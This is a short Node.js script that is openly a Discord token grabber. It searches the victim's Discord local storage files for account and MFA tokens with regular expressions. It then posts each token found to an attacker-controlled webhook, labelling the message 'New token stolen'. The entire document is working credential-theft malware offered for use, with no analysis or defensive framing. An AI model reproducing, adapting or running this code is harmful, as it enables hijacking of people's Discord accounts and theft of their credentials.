const homedir = process.env.APPDATA;
const fs = require('fs');
const request = require('request');

const ldbdir = `${homedir}/Discord/Local Storage/leveldb`;
const tokenfiles = (fs.readdirSync(ldbdir));
const webhookjson = JSON.parse(fs.readFileSync('./discord_webhook.json'));
const { webhook } = webhookjson;
const filesarr = [];

tokenfiles.forEach((element) => {
  if (element.match(/.log|.ldb/)) {
    const logp = `${ldbdir}/${element}`;
    const readlog = (fs.readFileSync(logp));
    filesarr.push(readlog.toString().match(/[\w-]{24}.[\w-]{6}.[\w-]{27}/));
    filesarr.push(readlog.toString().match(/mfa\.[\w-]{84}/));
  }
});
filesarr.forEach((item, index) => {
  if (item === null) {
    filesarr.splice(index, 1);
  } else if (typeof (item)) {
    item.forEach((item2) => {
      if (item2 !== null) {
        const setting = {
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `\nNew token stolen:\n\n ${item2}`,
            username: 'Token Grabber',
            avatar_url: 'https://cdn.website-editor.net/a5a3ceefad9c489497d5f344d4298b0e/dms3rep/multi/Computer-crime-concept.-606671804_6004x4002.jpeg',
          }),
          url: webhook,
          method: 'POST',
        };

        request(setting, (_, __, body) => {
          console.log(body);
        });
      }
    });
  }
});
